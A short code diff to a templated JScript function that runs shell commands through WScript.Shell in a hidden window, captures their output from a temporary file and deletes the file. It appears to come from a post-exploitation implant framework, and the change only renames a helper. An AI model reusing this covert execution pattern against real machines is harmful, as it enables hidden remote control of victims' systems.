@@ -7,7 +7,7 @@ function comspec(command) {
   try {
     {{ variables['wscript.shell'][0] }}.Run(command, 0, true);
     results = 'Executed ( ' + command + ' )\n\n';
-    results = results + download(stdout_path, 'string');
+    results = results + retrieve(stdout_path, 'string');
     delfile(stdout_path);
     return results;
   } catch (e) {
